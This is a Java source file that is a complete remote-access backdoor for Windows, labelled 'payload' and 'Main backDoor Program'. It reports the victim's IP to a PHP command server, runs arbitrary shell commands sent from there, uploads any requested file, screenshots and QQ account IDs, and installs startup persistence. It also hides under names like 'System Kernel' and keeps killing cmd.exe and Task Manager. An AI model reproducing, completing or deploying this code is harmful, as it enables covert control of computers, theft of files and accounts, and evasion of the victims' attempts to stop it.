package net.wind.test;

import sun.misc.BASE64Encoder;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/*** createTime 2022/10/15 0015* fileName payload** @author WindStream*/

public class payload extends Thread{ protected static String IP;
    public static Map<String, Object> doPost(String url, String content) {Map<String, Object> result = new HashMap<String, Object>();String errorStr = "";String status = "";String response = "";PrintWriter out = null;BufferedReader in = null;
        try {URL realUrl = new URL(url);URLConnection conn = realUrl.openConnection();HttpURLConnection httpUrlConnection = (HttpURLConnection) conn;
            httpUrlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");httpUrlConnection.setDoOutput(true);httpUrlConnection.setDoInput(true);out = new PrintWriter(httpUrlConnection.getOutputStream());out.write(content);out.flush();httpUrlConnection.connect();
            in = new BufferedReader(new InputStreamReader(httpUrlConnection.getInputStream()));String line;while ((line = in.readLine()) != null) {response += line;}
            status = new Integer(httpUrlConnection.getResponseCode()).toString();} catch (Exception e) {errorStr = e.getMessage();}
        finally {try {if (out != null) { out.close();}if (in != null) {in.close();}} catch (Exception ex) {/*Sign*/}}result.put("errorStr", errorStr);result.put("response", response);result.put("status", status);return result;}
    public static String doGet(String URL){URL=URL.replace(" ","[wind1]").replace("#","[wind2]").replace("+","[wind3]").replace("\n","[wind5]").replace("\\","[wind4]");//.replace("\n","[wind5]");
        HttpURLConnection conn = null;InputStream is = null;BufferedReader br = null;StringBuilder result = new StringBuilder();
        try{java.net.URL url = new URL(URL);conn = (HttpURLConnection) url.openConnection();conn.setRequestMethod("GET");conn.setConnectTimeout(15000);conn.setReadTimeout(60000);conn.setRequestProperty("Accept", "application/json");conn.connect();
            if (200 == conn.getResponseCode()){is = conn.getInputStream();br = new BufferedReader(new InputStreamReader(is, "UTF-8"));String line;while ((line = br.readLine()) != null){result.append(line);}
            }else{return "null";}}catch (Exception e){/*Sign*/}finally {try{if(br != null){br.close();}if(is != null){is.close();}}catch (IOException ioe){/*Sign*/}conn.disconnect();}return result.toString().replace("[wind1]"," ").replace("[wind2]","#").replace("[wind3]","+").replace("[wind4]","\\").replace("[wind5]","\n");
    }public static String getQQID(){Map<String,String> map = System.getenv();String username = map.get("USERNAME");
        File file = new File("C:\\Users\\"+username+"\\Documents\\Tencent Files");boolean ifHasQQ;if (file.exists()){ifHasQQ =true;}else {ifHasQQ = false;}if (ifHasQQ == true) {String QQIDLIST = "";
            for (int i = 0; i < file.listFiles().length; i++) {File file1 = file.listFiles()[i];if (file1.getName().equals("All Users")) {} else {QQIDLIST += file1.getName() + "circularholeB0yList";}}return QQIDLIST;}else {return "[error1337]";}}
    public static String DownloadFile(String Path){
        StringBuilder stringBuilder = new StringBuilder("");
        try {
            File loadfile = new File(Path);
            if (loadfile.exists()){
            stringBuilder.append(loadfile.getName());
            stringBuilder.append("windstream:1145141:1919810]");
            FileReader fileReader = new FileReader(loadfile);
            BufferedReader bufferedReader = new BufferedReader(fileReader);
            String tmp=null;
            int i=1;
            while ((tmp = bufferedReader.readLine()) != null){
                stringBuilder.append(tmp);
                i++;
            }
            bufferedReader.close();
            fileReader.close();
            }
            else{
                return "No File or PathName Named \""+Path+"\"";
            }

        }catch(Exception e){

        }
        return stringBuilder.toString();
    }
    protected static String phpClient = "";
    public void run() {
        IP = doGet("http://ident.me/");
        String y_System = System.getProperty("os.name");
        String System = y_System.replace(" ","");
        doGet(phpClient+"/connectHost.php?ip="+IP);
        doGet(phpClient+"/ClientSystem.php?ip="+IP+"&system="+System);
        doGet(payload.phpClient+"/ClienthostState.php?ip="+payload.IP+"&state=online");
        TaskSoft.TaskSoft();
        mainWhile:while(true) {
            setAutoRun();
            Runtime runtime =Runtime.getRuntime();
            String com=null;
            Process process;
            String str = null;
            String reply ="";
            try {
                Thread.sleep(1000);
                com = doGet(phpClient+"/ClientReadServer.php?ip="+IP);
                if(com.equals("")){

                }else {
                    if (com.split(" ")[0].toLowerCase().equals("window") && com.length() > 7){
                        String window_string = doGet("/ServerReadPost.php?ip="+IP);
                        doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply=Successful\n");
                        JOptionPane.showMessageDialog(null,window_string);
                        //doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply=Successful\n");
                        continue mainWhile;
                    } else if (com.split(" ")[0].toLowerCase().equals("download") && com.length()>9) {
                        doPost(phpClient + "/ClientPost.php?ip="+IP,DownloadFile(com.split(" ")[1]));
                        continue mainWhile;
                    } else if (com.toLowerCase().equals("getqqid")) {
                        doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply="+getQQID()+"\n");
                        continue mainWhile;
                    } else if (com.toLowerCase().equals("delhost")) {
                        doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply=Successful\n");
                        File batFile1 = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsRuntime.vbs");
                        File batFile2 = new File("C:\\Windows\\DesktopSoft.bat");
                        if (batFile1.exists()){
                            batFile1.delete();
                        }
                        if (batFile2.exists()){
                            batFile2.delete();
                        }
                        java.lang.System.exit(0);
                    } else if (com.toLowerCase().equals("screenshot")) {
                        doPost(phpClient+"/ClientPost.php?ip="+IP,ScreenShot());
                    } else{
                        process = runtime.exec("cmd /C " + com);
                        InputStream inputStream = process.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "gbk"));
                        while ((str = bufferedReader.readLine()) != null) {
                            reply += str + "[wind5]";
                        }
                        //doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply=" + reply);
                        doPost(phpClient+"/ClientPost.php?ip="+IP,reply);
                    }}
            } catch (Exception e) {
                doGet(phpClient + "/ClientShellReply.php?ip=" + IP + "&reply=Can't run because a error in program\n");
                continue mainWhile;
            }
        }
    }
    public static String ScreenShot() {String back =null;try {Robot robot = new Robot();
            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();Rectangle rectangle = new Rectangle(dimension);BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ImageIO.write(bufferedImage, "png", byteArrayOutputStream);byte[] bytes = byteArrayOutputStream.toByteArray();BASE64Encoder base64Encoder = new BASE64Encoder();String base64image = base64Encoder.encodeBuffer(bytes).trim();
            back = base64image.replaceAll("\n","").replaceAll("\r","");byteArrayOutputStream.close();}catch (Exception e){return "Can't get Screen Picture";}return back;}
    public static void setAutoRun() {
        try{String Jar_Path = String.valueOf(payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).replace("file:/","");File file = new File(Jar_Path);
        if (file.isDirectory()){}else {File batFile1 = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsRuntime.vbs");File batFile2 = new File("C:\\Windows\\DesktopSoft.bat");
        if (batFile2.exists()){batFile2.delete();batFile2.createNewFile();FileWriter batFile2Writer = new FileWriter(batFile2);batFile2Writer.write("@echo off\n" + "java -jar " + Jar_Path);batFile2Writer.close();
        }else {batFile2.createNewFile();FileWriter batFile2Writer = new FileWriter(batFile2);batFile2Writer.write("@echo off\n" + "java -jar " + Jar_Path);batFile2Writer.close();}
        if(batFile1.exists()){batFile1.delete();batFile1.createNewFile();FileWriter batFile1Writer = new FileWriter(batFile1);
            batFile1Writer.write("set ws=wscript.createobject(\"wscript.shell\")\n" + "ws.run \"C:\\Windows\\DesktopSoft.bat /start\",0\n" + "wscript.quit");batFile1Writer.close();}else {batFile1.createNewFile();FileWriter batFile1Writer = new FileWriter(batFile1);
            batFile1Writer.write("set ws=wscript.createobject(\"wscript.shell\")\n" + "ws.run \"C:\\Windows\\DesktopSoft.bat /start\",0\n" + "wscript.quit");batFile1Writer.close();}}}catch (Exception e){doGet(payload.phpClient + "/ClientShellReply.php?ip=" + payload.IP + "&reply=Can't Make AutoRun because a error in program\n");}}
    //Main backDoor Program
    public static void backDoor(){payload payload = new payload();payload.setPriority(10);payload.setName("System Kernel");payload.setDaemon(false);payload.start();}}
class TaskSoft extends Thread{ Runtime runtime = Runtime.getRuntime();public void run(){
           ddd:while(true) {try {Thread.sleep(500);List tasklist = new ArrayList();Process process = runtime.exec("tasklist");BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(),"utf-8"));
                String s = "";while ((s = br.readLine()) != null) {if ("".equals(s)) {continue;}tasklist.add(s+" ");}
                String maxRow = tasklist.get(1) + "";String[] maxCol = maxRow.split(" ");String[] taskName = new String[tasklist.size()];String[] taskPid = new String[tasklist.size()];String[] taskSessionName = new String[tasklist.size()];String[] taskSession = new String[tasklist.size()];String[] taskNec = new String[tasklist.size()];int i = 0;
                for (int lengh = tasklist.size();i<lengh; i++) {String data = tasklist.get(i) + "";int j=0;for (int length = maxCol.length; j < length; j++) {switch (j) {case 0: taskName[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 1: taskPid[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 2: taskSessionName[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 3: taskSession[i]=data.substring(0, maxCol[j].length()+1);data=data.substring(maxCol[j].length()+1);break; case 4: taskNec[i]=data;break;}}}
                int i1=0;
                for (int lengh = taskName.length; i1 < lengh; i1++) {if (taskName[i1].contains("cmd.exe")) {runtime.exec("taskkill /PID "+taskPid[i1]+" /f");}}
                runtime.exec("cmd /C for /f \"tokens=2\" %a in ('tasklist /fi \"imagename eq Taskmgr.exe\" /nh') do taskkill /F /PID %a");} catch (Exception e) {payload.doGet(payload.phpClient + "/ClientShellReply.php?ip=" + payload.IP + "&reply=Can't run because a error in program\n");continue ddd;}}}
    public static void TaskSoft(){TaskSoft taskSoft = new TaskSoft();taskSoft.setName("Runtime");taskSoft.setDaemon(true);taskSoft.setPriority(10);taskSoft.start();}}